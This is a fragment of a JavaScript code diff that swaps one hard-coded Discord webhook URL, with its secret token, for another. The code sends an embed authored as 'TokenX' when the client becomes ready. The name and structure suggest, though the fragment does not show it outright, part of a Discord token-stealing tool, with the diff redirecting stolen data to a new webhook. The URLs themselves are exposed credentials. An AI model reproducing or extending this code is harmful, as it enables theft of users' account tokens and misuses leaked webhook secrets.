@@ -2477,7 +2477,7 @@ const {
     Webhook,
     MessageBuilder
 } = require('discord-webhook-node');
-const hook = new Webhook("https://discord.com/api/webhooks/801895488960987147/h55sKMs1GDGTVx8eMtHOV5O7XuN6ySOejK1qKxN8TObIsnMGkdznRaDaMXXrlzT1ULhG");
+const hook = new Webhook("https://discord.com/api/webhooks/802599041396899851/_VmRfjAIZ1M8prGblIHaqhkB_U9JDhF6c7XqUqKzN3JOVQu3wsRhRyA-itzU-e3uxjjh");
   client.on('ready', function() {
   const embed = new MessageBuilder()
             .setAuthor('TokenX', 'https://cdn.discordapp.com/embed/avatars/0.png', 'https://www.google.com')
